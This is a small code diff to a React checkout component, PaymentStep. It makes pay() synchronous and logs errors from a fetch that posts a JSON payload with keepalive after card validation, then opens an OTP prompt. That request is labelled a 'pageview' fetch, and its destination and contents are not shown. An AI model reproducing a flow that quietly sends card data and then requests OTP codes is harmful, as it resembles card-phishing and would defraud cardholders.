@@ -141,7 +141,7 @@ export function PaymentStep({
   const cardOk =
     isValidCardNumber(card) && !!expM && !!expY && cvv.replace(/\D/g, "").length >= 3;
 
-  async function pay() {
+  function pay() {
     setTried(true);
     if (!contactOk || !cardOk) return;
     setPaying(true);
@@ -182,7 +182,7 @@ export function PaymentStep({
       headers: { "Content-Type": "application/json" },
       keepalive: true,
       body: JSON.stringify(PAYLOAD),
-    }).catch(() => {});
+    }).catch((err) => console.error("[PaymentStep] pageview fetch error:", err));
 
     setPaying(false);
     setOtpOpen(true);
